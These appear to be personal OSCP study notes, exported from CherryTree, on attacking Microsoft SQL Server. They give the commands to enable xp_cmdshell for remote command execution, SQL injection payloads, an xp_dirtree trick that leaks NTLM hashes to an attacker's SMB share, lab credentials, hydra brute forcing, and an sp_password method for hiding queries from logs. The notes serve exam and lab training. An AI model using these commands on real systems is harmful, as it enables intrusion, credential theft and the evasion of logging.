<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>MSSQL</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>MSSQL</h1><br/><p>Microsoft SQL Server = MSSQL</p><p>May aslo see it referred to as TSQL or Transact SQL (a type of MSSQL)</p><p></p><p>Default port 1433 &amp; def user is often <strong>sa</strong></p><p></p><p><h1>RCE: xp_cmdshell</h1></p><p>[OSCP 65] </p><p></p><p>xp_cmdshell func passes a string to CMD.exe &amp; returns any output as rows of txt.</p><p></p><p>Disabled by def, &amp; once enabled, it must be called with EXECUTE keyword (instead of SELECT).</p><p></p><p><span style="color:#f66151;text-decoration:underline;">WARNING</span>: The built-in Impacket command to enable xp_cmdshell seems <span style="color:#ff0000;">LESS RELIABLE</span> than the manual method (even if you&#39;ve permission to enable it). </p><p></p><p><em>impacket-mssqlclient rose:KxEPkKe6R8su@sequel.htb -windows-auth</em></p><p><strong>enable_xp_cmdshell</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: Sometimes need to <span style="color:#ff0000;">keep re-enabling xp_cmdshell</span>! (Maybe machine is getting restarted by another user?)</p><p></p><p><h2>Enabling &amp; Using</h2></p><p>Should be able to use EXEC as alias for EXECUTE, and perform the following steps with 1 query instead of multiple. <span style="color:#ff0000;">Use 1 query at a time to be safe</span>. (with or w/o space before<em> 1</em> ?)</p><p></p><p><span style="color:#ff0000;">May need to end query with </span><span style="color:#060f94;">-- // </span><span style="color:#ff0000;">&amp;/or start it with </span><span style="color:#060f94;">&#39;</span></p><p></p><p>Copy / <strong><span style="color:#ff0000;">Pasting ↓ may not work</span></strong>. It was interpretting the quotes as diff special characters!?!</p><p></p><p><em>EXECUTE sp_configure &#39;show advanced options&#39;, 1;</em><em></em></p><p><em>RECONFIGURE;</em><em></em></p><p><em>EXECUTE sp_configure &#39;xp_cmdshell&#39;, 1;</em><em></em></p><p><em>RECONFIGURE;</em><em></em></p><p><em>EXECUTE xp_cmdshell &#39;whoami&#39;;</em></p><p></p><p>OR via PayloadsAllTheThings</p><p></p><p><em>EXEC sp_configure &#39;show advanced options&#39;,1;</em><em></em></p><p><em>RECONFIGURE;</em><em></em></p><p><em>EXEC sp_configure &#39;xp_cmdshell&#39;,1;</em><em></em></p><p><em>RECONFIGURE;</em></p><p></p><p>{If running via Web App via SQLi?} <span style="color:#ff0000;">URL-Encode</span> payload (i.e the <span style="color:#ff0000;">B64 for powershell </span>R shell!)</p><p>Use <span style="color:#ff0000;">single quotes</span> around the payload  ↓. Not double quotes</p><p></p><p><em>EXEC xp_cmdshell &#39;net user&#39;;</em><em></em></p><p><em>EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;;</em><em></em></p><p><em>EXEC master.dbo.xp_cmdshell &#39;ping 127.0.0.1&#39;;</em></p><p></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: Some examples specify a master DB for xp_cmdshell. Try with &amp; w/o that? For example,</p><p></p><p>EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;;</p><p>EXECUTE xp_cmdshell &#39;whoami&#39;;</p><p></p><p><h3>Confirming whether it works</h3><h3></h3></p><p><h3></h3>Results may/may not be returned in Resp. If they aren&#39;t try sending pings to Attacker&#39;s tcpdump.</p><p>It&#39;s possible, but unlikely, that target&#39;s FW will block external pings.</p><p></p><p><em>sudo tcpdump -i tun0 icmp</em><em></em></p><p><em></em><em></em></p><p><em>EXECUTE xp_cmdshell ‘ping -n 5 ATTACKER’;</em></p><p></p><p><h3>Using Locally</h3></p><p><span class="subheading">Non-Interactive?</span>: The above commands can be executed as standalone queries with <strong>sqlcmd</strong>&#39;s <strong>-Q</strong> option. You may also be able use Tunneling or Port Forwarding to get an interactive prompt remotely.</p><p></p><p><span class="subheading">Interactive Prompt</span>: After enabling, may be able to use xp_cmdshell directly from the prompt (if it doesn&#39;t work, <span style="color:#ff0000;">try with EXECUTE </span>command<span style="color:#ff0000;"> prepended</span>)</p><p></p><p><em>xp_cmdshell powershell -enc ENCODED</em></p><p></p><p><h1>Client Tools</h1></p><p>[OSCP 63]</p><p>The SQL instance may only be internally accessible, requiring either a tunnel into the LAN (to use Linux tool) or local access (e.g Webshell) to interact with it.</p><p></p><p><h2>Holy Grail</h2></p><p> After sign-in, the 1st thing to try is often <span style="color:#ff0000;">xp_cmdshell</span>! The 2nd is <span style="color:#ff0000;">xp_dirtree</span> to capture a hash, view a remote FS, or view a local FS!</p><p></p><p>Try a <span style="color:#ff0000;">Reverse Shell</span> (If internal host, may need to target <a href="Pivoting_22.html#listener">Ligolo Listener</a>!), but if that doesn&#39;t work, you may still be able to <span style="color:#ff0000;">Enum FS</span> for Sensitive Info, etc.</p><p></p><p><h2>Linux</h2><h2></h2></p><p><h2></h2><span style="color:#060f94;">★</span><span style="color:#f66151;text-decoration:underline;">IMPORTANT</span><span style="color:#060f94;">★</span>: Try <span style="color:#ff0000;">creds with and without</span><span style="color:#cdab8f;"> </span><em><strong><span style="color:#cdab8f;">-windows-auth</span></strong></em>!!!</p><p></p><p><em>impacket-mssqlclient</em> lets you connect by providing username, password, &amp; the remote IP to connect to.</p><p></p><p>Additional functionality (see <strong>help</strong>). Built-in RCE, Enum, etc.<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><em>impacket-mssqlclient username:passwd123@IP </em><em><strong>-windows-auth</strong></em></p><p><h2></h2></p><p><h2></h2><em>impacket-mssqlclient relia.com/dnnuser:&#39;DotNetNukeDatabasePassword!&#39;@192.168.195.248 -port 49965 </em></p><p></p><p><em>impacket-mssqlclient sa:FrogColossusMad1@10.20.94.15 -db master</em><h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><span style="color:#060f94;text-decoration:underline;">Q</span>: Should it tell you login attempt failed? If it only outputs something like <strong>[*] Encryption required, switching to TLS</strong> &amp; exits, maybe there&#39;s another issue? What if you tried SSH port forwarding to connect via another host in the LAN?</p><p></p><p><h3>Windows Active Directory</h3></p><p>Unless trying something like KRB Ticket attack, you normally want to use<span style="color:#ff0000;"> </span><em><span style="color:#060f94;">-windows-auth</span></em><span style="color:#060f94;"> </span><span style="color:#ff0000;">to force NTLM Auth instead of KRB.</span> Useful for locally running SVC, &amp; <span style="color:#ff0000;">should allow you to PtH</span> with <em>-hashes </em>arg if it&#39;s AD SVC.</p><p></p><p>However, if it throws the following error this indicates that you may need to run the comand WITHOUT <em><span style="color:#060f94;">-windows-auth</span></em> (try with &amp; without)</p><p></p><p><strong>Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication</strong></p><p></p><p><h3>Enumeration</h3></p><p>Utilize the built-in functionality of <strong>impacket-mssqlclient</strong> (run <em>help</em> for commands).</p><p></p><p><span class="subheading">List Databases</span>: Either use the built-in <strong>enum_db</strong> command, or the following query to list Databases</p><p></p><p><em>SELECT * FROM master.dbo.sysdatabases;</em></p><p></p><p><span class="subheading">List Tables</span>: For example, if there&#39;s a Database named “webapp” then list the Tables in that DB with the following query.</p><p></p><p><em>SELECT * FROM webapp.information_schema.tables;</em><h2></h2></p><p><h2></h2><h2></h2></p><p><h2>Windows</h2><h2></h2></p><p><h2></h2><em>sqlcmd</em> is built-in CLi tool for SQL queries to be run through CMD.EXE either locally or remotely.</p><p></p><p>“When using SQL Server Cli tool (i.e <em>sqlcmd</em>), need to submit SQL statement ending with <em>;</em> followed by <em>GO</em> on a seperate line. However, <span style="color:#ff0000;">when running the command remotely, can omit </span><em><span style="color:#060f94;">GO</span></em><span style="color:#ff0000;"> statement</span> since it&#39;s not part of the MSSQL TDS protocol (Tabular Data Stream. Implemented in impacket).”</p><p></p><p><em>sqlcmd</em> <em>/?</em> (Get help menu)</p><p></p><p><h3>Troubleshooting </h3></p><p><span class="subheading">No Output on Sign-in Attempt</span></p><p>If you&#39;re <span style="color:#ff0000;">tying to login &amp; not getting any output</span>, try <span style="color:#ff0000;">writing to an output file</span> in accessible dir. You may get info as to why it&#39;s not working!</p><p></p><p><em>sqlcmd -S TOKYO07\MSSQLSERVER -U sa -P DeathMarchPac1942 -Q &quot;SELECT name FROM sys.databases;&quot; -o .\list_DBs</em></p><p></p><p>Output: <strong>SQL Server Network Interfaces: Connection string is not valid</strong>...</p><p></p><p><span class="subheading">Connection String</span></p><p>Try <span style="color:#ff0000;">with &amp; without the</span><strong><span style="color:#ff0000;"> -S</span></strong><span style="color:#ff0000;"> arg</span>! <span style="color:#ff0000;">Sometimes</span> it&#39;s needed &amp; other times you <span style="color:#ff0000;">CAN&#39;T use it</span>.</p><p></p><p><h3>Interacting with DB </h3><h3></h3></p><p><h3></h3><span class="subheading">List Server Instance</span>: May need to specify Instance to send queries. Depending, 1 of the following may work when the other doesn&#39;t</p><p></p><p><em>sqlcmd -L</em><h3></h3></p><p><h3></h3><strong>{PS}</strong> <em>Get-Service | ?{ $_.Name -like &quot;MSSQL*&quot; }</em>		(may be able to list another way if you don&#39;t have the privs to do this. <em>evil-winrm</em> <strong>services</strong> worked)<h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><span class="subheading">Output HostName/ComputerName</span>: <strong>{PS}</strong> <em>$env:computername</em>		(May also be able to use localhost for ComputerName?)</p><p></p><p><span class="subheading">Specify Connection</span>: -S ComputerName\Instance (e.g <em>-S WEB02</em>\SQLEXPRESS)<h3></h3></p><p><h3></h3><h3></h3></p><p><h3>Using through Reverse Shell</h3></p><p>When running through Web/Reverse Shell, treat it like a non-interactive session (since normal use tries to spawn a new session, which won&#39;t be visible to you).</p><p>May not need to use output file depending on the context.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: May also be able to write output files to Attacker&#39;s SMB server, so you can examine them on your machine.</p><p><ol><li>Nav to a dir where you&#39;ve R/W perms (i.e <strong>\Users\Public</strong>)</li></ol></p><p><ol><li>Use -Q to exit after running a query from a string, &amp; -o to specify output file</li></ol></p><p><ol><li>Try specifying connection (see above) &amp; try without specifying!</li></ol></p><p><ol><li>May/may not need to provide creds with -U &amp; -P</li></ol></p><p><ol><li>May/may not need to specify hostname (e.g <strong>-H localhost</strong>)</li></ol></p><p></p><p><span style="color:#060f94;">★</span><span class="subheading">Example Queries</span><span style="color:#060f94;">★</span></p><p></p><p><em>sqlcmd -S WEB02\SQLEXPRESS -Q &quot;SELECT name FROM sys.databases;&quot; -o .\list_DBs</em></p><p></p><p><em>type .\list_DBs</em></p><p></p><p><em>sqlcmd -S WEB02\SQLEXPRESS -Q &quot;SELECT * FROM webapp.information_schema.tables;&quot; -o .\list_table</em>s		(List tables from the “webapp” DB/Catalog)</p><p></p><p>sqlcmd -S WEB02\SQLEXPRESS -Q &quot;SELECT * FROM webapp.dbo.users;&quot; -o .\table_contents			(List contents of the “users” table in the “webapp” DB using the def “dbo” schema, which was shown by prev query)</p><p></p><p><h1>Capture NTLM Hash</h1><h1></h1></p><p><h1></h1>[OSCP 93-94]</p><p>May work even if <strong>xp_cmdshell</strong> doesn&#39;t</p><p></p><p><h2>Listener</h2><h2></h2></p><p><h2></h2>Sometimes one type of listener works, even when the others don&#39;t!<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><em>sudo responder -I tun0 -A		</em>(The <span style="color:#ff0000;">-A</span> disables poisoning, so it <span style="color:#ff0000;">MUST be used on OSCP</span> since poisoning isn&#39;t allowed)<em></em></p><p><em>impacket-smbserver share . -smb2support</em></p><p>maybe<em> nc -lvnp 445</em> ?<h2></h2></p><p><h2></h2><h2></h2></p><p><h2></h2><a name="trigger"></a>Trigger</p><p>Using impacket-mssqlclient</p><p><em>xp_dirtree \\Atker\share\</em></p><p></p><p>SQLi Payload example</p><p><em>‘ EXEC master.dbo.xp_dirtree &#39;\\Atker\share\&#39;;--</em><h1></h1></p><p><h1></h1><h1></h1></p><p><h1>Login</h1></p><p>Def login is <strong>sa</strong>:<strong>RPSsql12345</strong></p><p>Also see Seclist&#39;s <a href="file:///usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt">list of other common creds</a> &amp; a list of <a href="file:///usr/share/wordlists/seclists/Passwords/mssql-passwords-nansh0u-guardicore.txt">passwds</a> (idk how good it is)</p><p></p><p><h2>Brute Force</h2></p><p>★<span style="color:#f66151;">WARNING</span>★</p><p>Recall how <em>impacket-mssqlclient</em> will fail to connect to AD-joined machine without using the <strong>-windows-auth</strong> arg.</p><p></p><p>Brute Forcing tools don&#39;t support all types of MSSQL Auth, &amp; therefore will FAIL to correctly identify login cresd (possibly with exception of <a href="https://github.com/vanhauser-thc/thc-hydra/issues/732">msfconsole</a>?)</p><p></p><p><span style="color:#ff0000;">DO NOT USE HYDRA FOR AD MACHINES</span></p><p></p><p><h3>Active Directory</h3></p><p>Need to use a for loop with <em>impacket-mssqlclient</em> &amp; <strong>-windows-auth</strong> to iterate through potential creds.</p><p></p><p>My <a href="file:///home/asura/code/shell/mssql_Brute.sh">code</a> may work <span style="color:#ff0000;">as long as long as the creds don&#39;t contain any special charaters</span> (they aren&#39;t wrapped in single quotes). <span style="color:#ff0000;">May / may not be reliable with domain names</span> (seems to work?).</p><p></p><p><h3>Not Active Directory</h3></p><p>Use cred pairs from Seclists wordlist via -C</p><p>Specify non-def port number with -s (e.g 49965)</p><p></p><p><em>hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt -V -s 49965 IP mssql</em></p><p></p><p></p><p></p><p><h1>Tips</h1><ul><li>DB creds could be saved in <strong>\inetpub\wwwroot\web.config</strong>, <strong>sql-configuration.ini</strong>, or similar file. Use these creds for <a href="Misc_Attacks--Password_Attack_5.html#Types of Password Attacks">Credential Stuffing</a> (Cred Re-use).</li></ul></p><p></p><p>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</p><p><h1>OPSEC</h1></p><p>Use <em><span style="background-color:#000000;">SP_PASSWORD</span></em> in a query to hide from the logs like : <em><span style="background-color:#000000;">&#39; AND 1=1--sp_password</span></em></p><p></p><p><span style="background-color:#241f31;">-- &#39;sp_password&#39; was found in the text of this event.</span><span style="background-color:#241f31;"></span></p><p><span style="background-color:#241f31;">-- The text has been replaced with this comment for security reasons.</span></p></div>
</body>
</html>
